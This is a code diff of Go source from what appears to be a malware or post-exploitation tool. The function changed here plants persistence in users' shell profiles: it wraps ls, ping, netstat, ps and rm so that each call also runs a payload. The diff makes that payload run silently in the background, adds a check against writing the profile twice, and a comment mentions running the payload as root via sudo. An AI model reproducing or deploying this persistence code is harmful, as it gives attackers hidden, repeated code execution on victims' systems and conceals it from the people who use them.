@@ -79,6 +79,17 @@ func profiles() (err error) {
 	// source
 	sourceCmd := "source ~/.bashprofile"
 
+	// check if profiles are already written
+	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	if strings.Contains(string(data), sourceCmd) {
+		err = errors.New("profiles: already written")
+		return
+	}
+
 	// nologin users cannot do shit here
 	if strings.Contains(accountInfo["shell"], "nologin") ||
 		strings.Contains(accountInfo["shell"], "false") {
@@ -88,11 +99,11 @@ func profiles() (err error) {
 	}
 
 	// loader
-	loader := fmt.Sprintf("ls() { `which ls` $@; (%s) }", payload)
-	loader += fmt.Sprintf("\nping() { `which ping` $@; (%s) }", payload)
-	loader += fmt.Sprintf("\nnetstat() { `which netstat` $@; (%s) }", payload)
-	loader += fmt.Sprintf("\nps() { `which ps` $@; (%s) }", payload)
-	loader += fmt.Sprintf("\nrm() { `which rm` $@; (%s) }", payload)
+	loader := fmt.Sprintf("function ls() { `which ls` $@; (set +m;(%s)&) }", payload)
+	loader += fmt.Sprintf("\nfunction ping() { `which ping` $@; (set +m;(%s)&) }", payload)
+	loader += fmt.Sprintf("\nfunction netstat() { `which netstat` $@; (set +m;(%s)&) }", payload)
+	loader += fmt.Sprintf("\nfunction ps() { `which ps` $@; (set +m;(%s)&) }", payload)
+	loader += fmt.Sprintf("\nfunction rm() { `which rm` $@; (set +m;(%s)&) }", payload)
 
 	// exec our payload as root too!
 	// sudo payload
